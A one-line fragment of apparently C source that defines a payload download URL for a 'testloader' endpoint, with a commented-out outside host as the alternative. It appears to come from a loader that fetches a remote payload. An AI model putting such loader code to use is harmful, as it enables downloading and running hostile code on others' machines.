...
#define PAYLOAD_URL "https://127.0.0.1:25566/api/testloader?send=payload-6&uid=" //"https://fruit.qc.to:25566/api/testloader?send=payload-6" // URL to download the payload from
